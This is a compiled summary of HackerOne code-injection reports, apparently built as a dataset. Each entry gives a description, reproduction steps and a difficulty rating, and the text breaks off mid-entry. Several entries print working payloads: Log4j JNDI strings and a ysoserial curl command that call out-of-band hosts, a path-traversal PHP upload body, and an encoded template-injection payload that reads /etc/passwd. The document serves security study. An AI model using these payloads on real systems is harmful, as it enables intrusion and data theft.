Injection Vulnerabilities Analysis
==================================================

Total reports analyzed: 199

Code Injection Vulnerabilities (57 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1016966: Remote Code Execution in Basecamp Windows Electron App
================================================================================
Vulnerability Description:
The Basecamp Windows Electron app has a remote code execution vulnerability due to improper validation of download URLs and mimetypes. By crafting a URL with a subdomain that bypasses internal domain checks and serving a file with a 'text/calendar' mimetype, an attacker can execute arbitrary code on a user's machine when they click the link.

Steps to Reproduce:
1. Register a subdomain that starts with 'launchpad.dev.' (e.g., launchpad.dev.mydomain.com)
2. Set up an HTTP server with Flask that serves a malicious file with the 'text/calendar' mimetype
3. Add a link to a post in Basecamp with the crafted URL (e.g., http://launchpad.dev.mydomain.com/file.exe?attachment=true)
4. When a user clicks the link in the Basecamp Windows Electron app, the file is downloaded and executed
Exploitation Difficulty:
The vulnerability involves multiple components (subdomain bypass, mimetype manipulation, and URL parameter manipulation) and requires understanding the application's internal domain validation logic. However, the steps to exploit it are relatively straightforward once the bypass techniques are known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1067291: RCE in ██████ subdomain via CVE-2017-1000486
================================================================================
Vulnerability Description:
The application uses a vulnerable version of primefaces (5.3, not 5.3.8), which is susceptible to unauthenticated remote code execution (RCE) via CVE-2017-1000486. An attacker can execute arbitrary commands on the server as the tomcat user.

Steps to Reproduce:
1. Get the publicly available POC for this vulnerability from https://github.com/pimps/CVE-2017-1000486
2. Execute the POC with the command: python primefaces.py ███/ftn-Website/ -c id
Exploitation Difficulty:
The vulnerability is straightforward to exploit using a publicly available proof-of-concept (POC) script. The attack does not involve multiple components, complex interactions, or novel logic. It simply requires running the POC against the vulnerable endpoint.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1070532: RCE Apache Struts2 remote command execution (S2-045) on [wifi-partner.mtn.com.gh]
================================================================================
Vulnerability Description:
A Remote Code Execution (RCE) vulnerability exists in Apache Struts2 when using the Jakarta Multipart parser for file uploads. By manipulating the Content-Type header with malicious OGNL expressions, an attacker can execute arbitrary commands on the server.

Steps to Reproduce:
1. Send a crafted HTTP GET request to the vulnerable endpoint with a malicious Content-Type header containing OGNL (Object-Graph Navigation Language) expressions.
2. The crafted Content-Type header triggers the vulnerability, allowing the execution of arbitrary commands (in this case, printing the result of 31337*31337).
Exploitation Difficulty:
The attack involves a single, well-documented exploit (S2-045) with a straightforward payload. The complexity is low because it does not require multiple components, subtle interactions, complex state manipulation, or novel logic. The exploit is widely known and documented.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1115864: Persistant Arbitrary code execution in mattermost android
================================================================================
Vulnerability Description:
The vulnerability involves a path traversal issue in the Mattermost Android app, where the ShareActivity component improperly handles file names from a content provider, allowing an attacker to overwrite critical library files with malicious ones, leading to arbitrary code execution.

Steps to Reproduce:
1. Install the POC app (app-release.apk) and open it.
2. Launch the app again to trigger the execution of the malicious code.
Exploitation Difficulty:
The attack requires understanding and manipulating multiple components: the ShareActivity's exported status, the content provider's handling of file names, and the path traversal in file creation. The interaction between these components is non-obvious, and the attacker must craft a malicious content provider to exploit the vulnerability.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1125425: RCE via unsafe inline Kramdown options when rendering certain Wiki pages
================================================================================
Vulnerability Description:
The vulnerability allows arbitrary Ruby code execution via unsafe inline Kramdown options when rendering Wiki pages. An attacker can exploit this by uploading a malicious .rmd file that leverages Kramdown's inline options to load and execute arbitrary Ruby code through the Rouge syntax highlighter's formatter option and Redis driver's directory traversal.

Steps to Reproduce:
1. Create a new snippet with any title and file containing Ruby code (e.g., `puts "hello from ruby"` or `echo vakzz was here > /tmp/vakzz`)
2. Note the upload path of the snippet file (e.g., `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`)
3. Create a new project and navigate to its Wiki section
4. Clone the Wiki repository locally
5. Create a new .rmd file with malicious Kramdown inline options pointing to the snippet file (e.g., `{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb}" /}`)
6. Commit and push the changes to the Wiki repository
7. Access the uploaded .rmd file in the Wiki to trigger the payload execution
Exploitation Difficulty:
This vulnerability requires deep understanding of multiple components: Kramdown's inline options, Rouge syntax highlighter's formatter selection, Redis driver's directory traversal, and GitLab's file upload paths. The attacker must chain these components together in a non-obvious way to achieve code execution.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1154034: Argument/Code Injection via ActiveStorage's image transformation functionality
================================================================================
Vulnerability Description:
The vulnerability allows for argument/code injection via ActiveStorage's image transformation functionality, which can lead to remote code execution (RCE) by manipulating user-supplied inputs passed to variant() or preview() methods.

Steps to Reproduce:
1. Identify a Rails application using ActiveStorage with image transformation functionality.
2. Craft a malicious URL or form input that passes user-controlled parameters to the variant() or preview() methods.
3. Exploit the argument injection by passing an array that injects arbitrary arguments into the ImageMagick command.
4. Alternatively, exploit code injection by passing a method name and argument that executes arbitrary Ruby code.
Exploitation Difficulty:
The vulnerability involves understanding the interaction between Rails' ActiveStorage, ImageProcessing gem, and MiniMagick, as well as the method chaining and argument passing mechanisms that lead to command injection. The attack requires knowledge of how these components interact and how to craft inputs that exploit this interaction.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1154542: RCE when removing metadata with ExifTool
================================================================================
Vulnerability Description:
GitLab Workhorse passes image files to ExifTool for metadata sanitization, but ExifTool processes files based on content rather than extension. A crafted DjVu file with malicious metadata can exploit Perl's eval() in ExifTool's DjVu parser to achieve remote code execution, despite file extension restrictions.

Steps to Reproduce:
1. Download a specially crafted DjVu file (e.g., echo_vakzz.jpg.zip) and unzip it
2. Upload the file to GitLab via the snippet creation interface (Attach a file option)
3. Observe arbitrary command execution on the server (e.g., file creation in /tmp)
Exploitation Difficulty:
The vulnerability requires understanding multiple components: GitLab's file processing pipeline, ExifTool's file type detection bypass, and the specific Perl eval() injection in DjVu metadata parsing. The interaction between these components is non-obvious, particularly the file content vs extension behavior and the Perl injection vector through metadata.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1248040:  Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)
================================================================================
Vulnerability Description:
This vulnerability allows unauthenticated remote code execution (RCE) in ForgeRock OpenAM via unsafe Java deserialization in the Jato framework. An attacker can craft a malicious serialized object that gets deserialized by the server, leading to arbitrary code execution.

Steps to Reproduce:
1. Download the ysoserial payload generator jar file: `wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar`
2. Generate the payload with a command to trigger a request to a Burp Collaborator instance: `java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`
3. Send the payload in a GET request to the vulnerable OpenAM endpoint: `GET /██████████=XYZ HTTP/1.1` (replace XYZ with the contents of payload.txt)
Exploitation Difficulty:
The attack requires multiple non-trivial steps including payload generation and encoding, but follows well-known Java deserialization attack patterns. The vulnerability itself is not novel (common deserialization flaw) and the components (ysoserial, base64 encoding) are standard tools/techniques in security testing.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1248052: Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)
================================================================================
Vulnerability Description:
This vulnerability is a pre-authentication Remote Code Execution (RCE) in ForgeRock OpenAM, caused by unsafe Java deserialization in the Jato framework. An attacker can exploit this by sending a specially crafted request that triggers the deserialization of malicious payloads, leading to arbitrary code execution on the server.

Steps to Reproduce:
1. Download the ysoserial jar file and generate a payload using a command that includes a malicious URL.
2. Send a crafted GET request to the target OpenAM server with the generated payload in the 'jato.pageSession' parameter.
Exploitation Difficulty:
The attack involves generating a serialized payload and crafting a specific HTTP request, which requires knowledge of Java deserialization vulnerabilities and the structure of the vulnerable endpoint. However, the steps are straightforward once the payload generation and endpoint are known, and the vulnerability is a common type (unsafe deserialization) with known exploitation patterns.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1249456: Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)
================================================================================
Vulnerability Description:
Pre-auth RCE in ForgeRock OpenAM due to unsafe Java deserialization in the Jato framework, allowing unauthenticated attackers to execute arbitrary code.

Steps to Reproduce:
1. Download the ysoserial tool and generate a payload using a command like: `java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`
2. Send a crafted GET request to the target with the payload from payload.txt in the URL parameter
Exploitation Difficulty:
The attack requires knowledge of Java deserialization vulnerabilities and the specific framework (Jato) used by OpenAM. While the steps are straightforward once the payload is generated, understanding the underlying vulnerability and crafting the correct payload requires specialized knowledge.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1356845: CVE-2021-40870 on [52.204.160.31]
================================================================================
Vulnerability Description:
An unrestricted file upload vulnerability in Aviatrix Controller 6.x allows unauthenticated attackers to upload arbitrary files (including PHP scripts) via directory traversal, leading to remote code execution.

Steps to Reproduce:
1. Send a POST request to /v1/backend1 with a crafted payload that includes directory traversal in the account_name parameter to upload a PHP file containing arbitrary code.
2. Retrieve the uploaded PHP file via a GET request to execute the arbitrary code and confirm RCE by observing the phpinfo() output.
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of an unrestricted file upload flaw combined with directory traversal, which are well-known attack vectors. The steps to reproduce are simple and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1360593: CVE-2021-40870 in [███]
================================================================================
Vulnerability Description:
An unrestricted file upload vulnerability in Aviatrix Controller allows unauthenticated attackers to upload malicious PHP files via directory traversal, leading to remote code execution.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint with a crafted payload that includes directory traversal and a PHP file upload: POST /v1/backend1 HTTP/1.1 with CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>
2. Retrieve the uploaded PHP file to confirm remote code execution: GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
Exploitation Difficulty:
The attack involves a straightforward file upload with directory traversal, a well-known vulnerability pattern. No complex interactions or novel logic is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1378175: Ingress-nginx annotation injection allows retrieval of ingress-nginx serviceaccount token and secrets across all namespaces
================================================================================
Vulnerability Description:
The vulnerability allows an attacker with permissions to create/modify Ingress resources to inject malicious nginx directives via unescaped template variables in annotations. This leads to arbitrary file read on the ingress controller, including the service account token which has cluster-wide secrets access.

Steps to Reproduce:
1. Identify an ingress-nginx controller version vulnerable to annotation injection (e.g., v1.0.4).
2. Create or modify an Ingress resource with a malicious annotation (e.g., nginx.ingress.kubernetes.io/connection-proxy-header) containing injected nginx directives.
3. Use the injected directives to read arbitrary files from the ingress controller's filesystem, including the service account token.
4. Use the stolen service account token to access secrets across all namespaces.
Exploitation Difficulty:
While the vulnerability requires understanding of nginx configuration injection and Kubernetes RBAC, the attack path is relatively straightforward once the template injection vector is identified. The main complexity comes from knowing which annotations are vulnerable and how to craft the malicious payload.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1429014: Log4Shell: RCE 0-day exploit on █████████
================================================================================
Vulnerability Description:
This vulnerability, known as Log4Shell, is a Remote Code Execution (RCE) exploit in the Log4j Java logging library. It allows attackers to execute arbitrary code by exploiting the JNDI (Java Naming and Directory Interface) lookup feature in Log4j when it processes specially crafted log messages.

Steps to Reproduce:
1. Go to the vulnerable URL and append the provided POC code to the specified parameter.
2. Monitor the Burp Collaborator for a reverse ping back, confirming the vulnerability.
Exploitation Difficulty:
The attack involves a straightforward injection of a malicious string into a URL parameter, which triggers the vulnerability. The complexity is low because the exploit does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and the steps to reproduce are simple and well-documented.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1442644: Log4j Java RCE in [beta.dev.adobeconnect.com]
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in Log4j versions prior to 2.15.0, where an attacker can exploit the JNDI lookup feature to execute arbitrary code via LDAP. The server logs the malicious input, triggering the vulnerability.

Steps to Reproduce:
1. Send a crafted HTTP GET request to the target URL with a JNDI lookup string in the query parameter: GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
2. Observe the response or check the Burp Collaborator for any incoming LDAP requests, indicating the server is vulnerable to Log4j RCE
Exploitation Difficulty:
The attack is straightforward, involving a single HTTP request with a crafted JNDI lookup string. No complex interactions or state manipulations are required. The vulnerability is well-documented and widely known, making it easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1537543: ██████████ vulnerable to CVE-2022-22954
================================================================================
Vulnerability Description:
CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution. An attacker can exploit this by sending a specially crafted request to a vulnerable instance, potentially gaining full control of the server.

Steps to Reproduce:
1. Visit the vulnerable URL and intercept the request using a tool like Burp Suite
2. Append the crafted endpoint '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d' to the request and analyze the response
Exploitation Difficulty:
The vulnerability involves a straightforward injection attack with a known payload. The complexity is low because the attack does not require multiple components, complex state manipulation, or novel logic. The payload is publicly documented for this specific CVE.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1537694: ███ vulnerable to CVE-2022-22954
================================================================================
Vulnerability Description:
CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution via a crafted HTTP request.

Steps to Reproduce:
1. Identify a target system running VMware Workspace ONE Access or Identity Manager.
2. Send a specially crafted HTTP GET request with a server-side template injection payload to the vulnerable URL.
3. Observe the response for evidence of remote code execution, such as the contents of '/etc/passwd' being returned.
Exploitation Difficulty:
The attack involves a single, straightforward step of sending a crafted request to a known vulnerable endpoint. The payload is a standard template injection, and the interaction is direct with no need for complex state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1624172: [███████] Remote Code Execution at ██████ [CVE-2021-44529] [HtUS]
================================================================================
Vulnerability Description:
A code injection vulnerability in the Ivanti EPM Cloud Services Appliance (CSA) allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).

Steps to Reproduce:
1. Identify the vulnerable server running Ivanti EPM Cloud Services Appliance (CSA).
2. Use Burp Repeater to send a GET request to the vulnerable endpoint with a Base64 encoded system command (e.g., 'cGhwaW5mbygpOw==' for phpinfo).
Exploitation Difficulty:
The vulnerability involves a straightforward injection of Base64 encoded commands via a GET request, without requiring complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1631364: ██████_log4j - https://██████
================================================================================
Vulnerability Description:
The vulnerability is a Log4j Remote Code Execution (RCE) vulnerability, where logging untrusted or user-controlled data with a vulnerable version of Log4J can lead to RCE. This includes data from logged errors, authentication failures, and other unexpected vectors of user-controlled input.

Steps to Reproduce:
1. Send a POST request to the endpoint: https://██████/mifs/j_spring_security_check
2. Use the following payload in the request: j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee
Exploitation Difficulty:
The attack involves a straightforward exploitation of a known vulnerability (Log4j) with a simple payload. It does not require multiple components, complex interactions, or novel logic. The steps are well-documented and widely known in the security community.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1631370: solr_log4j - http://██████████
================================================================================
Vulnerability Description:
The vulnerability is a Log4j Remote Code Execution (RCE) issue in the Solr application. By logging untrusted or user-controlled data with a vulnerable version of Log4J, an attacker can execute arbitrary code remotely. This includes exploiting logged errors, exception traces, or authentication failures where user input is included.

Steps to Reproduce:
1. Identify the Solr admin endpoint: http://████████/solr/admin/collections
2. Send a GET request to the endpoint with a crafted JNDI payload: http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D
Exploitation Difficulty:
The attack involves a straightforward exploitation of a well-known vulnerability (Log4j RCE) using a simple JNDI payload. The steps are minimal and do not require complex interactions or state manipulation. The vulnerability is widely documented, making it easier to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1636382: Synthetics Recorder: Code injection when recording website with malicious content
================================================================================
Vulnerability Description:
The vulnerability allows for code injection in the Synthetics Recorder when recording a website with malicious content. Specifically, the waitForNavigation event's quote function fails to properly escape user-controlled input within a multi-line comment context, enabling an attacker to inject arbitrary code that executes when the recorded session is run.

Steps to Reproduce:
1. Install and run the Synthetics Recorder in development mode or download the binary.
2. Start recording a session with a malicious URL designed to break out of the comment context in the generated code.
3. Export the recorded session and execute it using the synthetic runner to trigger the arbitrary command execution.
Exploitation Difficulty:
The attack requires understanding the specific context in which the quote function is used within a multi-line comment, crafting a URL that can break out of this context without using escaped characters, and knowing how the recorded session is executed. The interaction between the URL crafting and the comment context is subtle and not immediately obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1652042: CVE-2022-21831: Possible code injection vulnerability in Rails / Active Storage
================================================================================
Vulnerability Description:
The vulnerability in Rails/Active Storage allows for code injection through malicious image files. When Active Storage processes these images, it fails to properly sanitize input, leading to potential remote code execution (RCE). This occurs because the image processing API can be tricked into executing embedded Ruby code or shell commands contained within the image's metadata or comments.

Steps to Reproduce:
1. Identify a Rails application using Active Storage with image processing enabled.
2. Upload a malicious image file containing embedded Ruby code or shell commands in the metadata or comment fields.
3. Trigger the image processing function, which will execute the embedded code due to improper sanitization in Active Storage.
Exploitation Difficulty:
The vulnerability involves understanding the interaction between Active Storage's image processing functionality and the way it handles file metadata. The attacker needs to know how to embed malicious code in image files and understand how Rails processes these files. While the concept of code injection is common, the specific vector through image metadata is less obvious and requires knowledge of Rails internals.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1776476: CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example
================================================================================
Vulnerability Description:
The vulnerability is a command injection flaw in Apache Airflow's example_bash_operator.py, where the 'run_id' parameter is not properly sanitized before being used in a bash command. This allows an attacker to inject and execute arbitrary OS commands.

Steps to Reproduce:
1. Navigate to the DAGs menu in Apache Airflow and select the 'example_bash_operator' task.
2. Select 'Trigger DAG w/ config' and set the 'run_id' parameter to a malicious command, e.g., 'touch /tmp/success'.
3. Trigger the DAG to execute the injected command.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a direct command injection in a visible parameter ('run_id') without any complex interactions or state manipulations. The attack path is linear and does not require understanding of multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/181321: Use after free vulnerability in mruby Array#to_h causing DOS possible RCE
================================================================================
Vulnerability Description:
The vulnerability is a use-after-free in mruby's Array#to_h method where improper bounds checking after a callback to to_ary can lead to out-of-bounds memory access. When an array is modified during the to_ary callback, the subsequent attempt to access array elements can read invalid memory, potentially leading to denial of service or remote code execution.

Steps to Reproduce:
1. Define a new class A with a to_ary method that clears a global array and returns nil
2. Create a global array $a containing an instance of class A
3. Call to_h on the global array $a
Exploitation Difficulty:
This vulnerability requires deep understanding of mruby's internal array handling, callback mechanisms during type conversion, and memory management. The attacker must carefully craft object interactions during a sensitive type conversion operation, and understand how array modifications during callbacks affect subsequent memory accesses. The exploitation path involves non-obvious interactions between array operations, type conversions, and exception handling.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/181879: Struct type confusion RCE
================================================================================
Vulnerability Description:
The vulnerability involves a struct type confusion in mruby that allows an attacker to manipulate memory structures, leading to arbitrary code execution. By carefully crafting input, the attacker can confuse the interpreter about the type of a struct, resulting in memory corruption and control over the instruction pointer.

Steps to Reproduce:
1. Analyze the mruby interpreter to understand how struct types are handled in memory.
2. Create a proof of concept script that manipulates struct types to cause type confusion, leading to arbitrary memory access.
3. Execute the script in the mruby environment to demonstrate control over the instruction pointer, causing a segfault at a controlled address (e.g., 0x0000133713371337).
4. Extend the attack to achieve arbitrary read/write primitives for full remote code execution.
Exploitation Difficulty:
This vulnerability requires deep understanding of mruby's memory management and struct handling. The attacker must identify and exploit subtle interactions between struct types and memory operations, which is non-trivial and involves manipulating complex application states. Additionally, the attack leverages novel logic specific to mruby's implementation, making it less obvious to discover.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/181893: TOCTTOU bug in mrb_str_setbyte leading the memory corruption
================================================================================
Vulnerability Description:
The vulnerability is a Time-of-Check to Time-of-Use (TOCTTOU) bug in mrb_str_setbyte where the string length is cached before argument processing. During argument conversion (to_i), malicious Ruby code can modify the string, causing it to be reallocated shorter. This leads to an out-of-bounds write when the original cached length is used.

Steps to Reproduce:
1. Create a large string $s with '9' followed by many newlines
2. Define a class Tmp with a to_i method that modifies $s and $k
3. Call $s.setbyte(128, Tmp.new) which triggers the vulnerability
4. Observe memory corruption or crash due to out-of-bounds write
Exploitation Difficulty:
This vulnerability requires understanding of: 1) Ruby's method argument conversion process, 2) string memory management in mruby, 3) precise timing to trigger the TOCTTOU condition, and 4) crafting a malicious to_i method that modifies the string state during conversion. The interaction between these components is subtle and requires deep knowledge of mruby internals.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/182104: Completed Compromise & Source Code Disclosure via Exposed Jenkins Dashboard at https://jenkins101.udemy.com
================================================================================
Vulnerability Description:
Critical information disclosure via an exposed Jenkins dashboard that allowed unauthorized access to Udemy's complete Django source code, including database schemas and credentials for multiple services.

Steps to Reproduce:
1. Navigate to the exposed Jenkins dashboard at https://jenkins101.udemy.com
2. Authenticate using a GitHub account to gain access to the Jenkins Dashboard
Exploitation Difficulty:
The vulnerability was straightforward to discover as it involved accessing a publicly exposed Jenkins dashboard and authenticating with a GitHub account, which then provided full access without additional complex steps or interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/185051: Type confusion in wrap_decimal leading to memory corruption
================================================================================
Vulnerability Description:
The vulnerability involves a type confusion issue in the 'wrap_decimal' function where the Decimal class can be redefined, leading to an invalid class lookup. This can result in memory corruption or arbitrary code execution when operations are performed on the original Decimal object after the class has been redefined.

Steps to Reproduce:
1. Create a Decimal object: olddecimal = Decimal.new(1)
2. Redefine the Decimal class: Decimal = Hash
3. Perform a negation operation on the old decimal: a = -olddecimal
4. Print the result: puts a
Exploitation Difficulty:
The attack requires understanding of Ruby's dynamic class system and the ability to redefine classes during runtime. The interaction between the original Decimal object and the redefined Decimal class is subtle and non-obvious, as it leads to unexpected behavior in the 'wrap_decimal' function.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/198734: GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
================================================================================
Vulnerability Description:
The vulnerability is a type-confusion issue in PHP's GMP deserialization that allows an attacker to manipulate object properties during deserialization. This can be exploited to update any properties of any object in the object store, leading to remote code execution in MyBB <= 1.8.3 by manipulating the $templates object's $cache property.

Steps to Reproduce:
1. Identify the target system running MyBB <= 1.8.3 and PHP 5.6 <= 5.6.11.
2. Craft a malicious cookie payload that exploits the GMP deserialization type confusion vulnerability to manipulate the $templates object's $cache property.
3. Send the crafted cookie to the target system via a curl command or similar HTTP request.
4. Trigger the eval() function in the template parsing process to execute arbitrary PHP code.
Exploitation Difficulty:
This vulnerability involves multiple complex components: understanding PHP's GMP deserialization flaw, manipulating object properties during deserialization, and leveraging MyBB's template system to execute arbitrary code. The attack requires deep knowledge of PHP internals and MyBB's architecture, as well as the ability to chain these components together effectively.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2039464: Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation
================================================================================
Vulnerability Description:
The vulnerability allows code injection via the nginx.ingress.kubernetes.io/permanent-redirect annotation in Kubernetes Ingress objects. The annotation value is not sanitized before being passed to the NGINX configuration, enabling attackers with ingress creation/update permissions to execute commands on the ingress-nginx-controller pod. This can lead to Kubernetes API access via the mounted ServiceAccount token and potential cluster-wide secret exfiltration.

Steps to Reproduce:
1. Install NGINX Ingress controller using Helm with the provided values.yaml
2. Apply the ingress.yaml file containing the malicious nginx.ingress.kubernetes.io/permanent-redirect annotation
Exploitation Difficulty:
The vulnerability requires understanding of Kubernetes Ingress annotations and NGINX configuration, but the attack path is relatively straightforward once the unsanitized annotation behavior is discovered. The components involved (Ingress controller, NGINX config) are common and well-documented.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/206227: Remote Code Execution on Git.imgur-dev.com 
================================================================================
Vulnerability Description:
The vulnerability involves exploiting a known Rails static key vulnerability in an outdated version of GitHub Enterprise Server, leading to Remote Code Execution (RCE).

Steps to Reproduce:
1. Identify that the GitHub Enterprise Server (https://git.imgur-dev.com/) is running an outdated version (below 2.8.7).
2. Exploit the known Rails static key vulnerability to achieve Remote Code Execution (RCE).
Exploitation Difficulty:
The vulnerability relies on a known issue (Rails static key) in an outdated software version, making it straightforward to exploit once the outdated version is identified. No novel or complex interactions are required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/218088: Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier
================================================================================
Vulnerability Description:
The vulnerability involves a deficiency in DNS response verification in RubyGems, allowing a MiTM attacker to poison DNS responses and redirect clients to malicious gem servers. This can lead to remote code execution via trojaned gems.

Steps to Reproduce:
1. Perform a DNS SRV query for '_rubygems._tcp.rubygems.org' to discover the gem server API location.
2. Intercept and poison the DNS response to redirect the client to an attacker-controlled server (e.g., 'evil.com/api.rubygems.com').
3. Serve malicious gem content from the attacker-controlled server to the client, leading to remote code execution.
Exploitation Difficulty:
The attack requires understanding DNS SRV records, MiTM capabilities, and gem trojaning techniques. However, the components (DNS poisoning, gem server redirection) are well-documented and the interaction is straightforward once the DNS response is manipulated.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/222020: Mercurial can be tricked into granting authorized users access to the Python debugger
================================================================================
Vulnerability Description:
The vulnerability allows authorized users to trick Mercurial into granting access to the Python debugger by exploiting a lack of input validation in customized hg-ssh wrappers. This can lead to arbitrary Python code execution.

Steps to Reproduce:
1. Identify a service hosting a Mercurial server with a customized hg-ssh wrapper that does not validate user input to the repo attribute.
2. Supply a string of "--debugger" as the repo attribute when interacting with the Mercurial server.
3. This causes the internal hg binary to drop to a Pdb shell, allowing arbitrary Python code execution.
Exploitation Difficulty:
The attack involves understanding the interaction between the hg-ssh wrapper and the Mercurial binary, as well as recognizing the opportunity to inject the "--debugger" argument. While the concept of argument injection is not novel, the specific interaction with Mercurial's debugger feature is non-obvious and requires knowledge of Mercurial's internal workings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2231019: CVE-2023-5528: Insufficient input sanitization in in-tree storage plugin leads to privilege escalation on Windows nodes
================================================================================
Vulnerability Description:
The vulnerability involves insufficient input sanitization in an in-tree storage plugin in Kubernetes, which allows an attacker to escalate privileges on Windows nodes by executing arbitrary code with SYSTEM privileges through the kubelet context.

Steps to Reproduce:
1. Identify the in-tree storage plugin in Kubernetes that is vulnerable to insufficient input sanitization on Windows nodes.
2. Craft a malicious input that exploits the insufficient sanitization to execute arbitrary code in the context of the kubelet (SYSTEM privileges).
Exploitation Difficulty:
The vulnerability requires understanding of Kubernetes' storage plugin architecture and the specific input sanitization flaws in the Windows node context. While the attack vector is clear once identified, discovering it involves knowledge of Kubernetes internals and Windows privilege escalation techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/228825: (Authenticated) RCE by bypassing of the .htaccess blacklist
================================================================================
Vulnerability Description:
The vulnerability allows an authenticated user to bypass the .htaccess blacklist by copying malicious files from an external storage (including federated shares) to the local data directory, leading to Remote Code Execution (RCE) when the data directory is inside the webroot.

Steps to Reproduce:
1. Setup an evil instance (nc1) with the file blacklist disabled and create a folder 'sharefolder/attack' with malicious .htaccess and attack.php files.
2. Federated share 'sharefolder' from nc1 to a non-evil instance (nc2) and move 'sharefolder/attack' to 'attack' in nc2.
3. Navigate to http://nc2/data/userid/files/attack/attack.php to execute the attack.
Exploitation Difficulty:
The attack involves multiple components (evil instance setup, federated sharing, file manipulation) and requires understanding of the .htaccess blacklist bypass. However, the interaction between these components is relatively straightforward once the initial setup is understood.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2762119: CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
================================================================================
Vulnerability Description:
DotNetNuke (DNN) versions 5.0.0 to 9.3.0 are vulnerable to a deserialization attack via the DNNPersonalization cookie, which can lead to remote code execution (RCE). The vulnerability arises when the application processes the cookie during the loading of user profile data, particularly when handling 404 errors with the default error page.

Steps to Reproduce:
1. Identify the target DotNetNuke (DNN) version (5.0.0 - 9.3.0) and confirm it is configured to use the default 404 error page.
2. Use YSoSerial.net with the DotNetNuke plugin to generate a malicious payload that exploits the deserialization vulnerability in the DNNPersonalization cookie.
3. Send a crafted HTTP request to the target server with the malicious payload in the DNNPersonalization cookie to trigger the deserialization vulnerability.
4. Observe the response to confirm remote code execution (RCE) or other desired effects (e.g., file read, reverse shell).
Exploitation Difficulty:
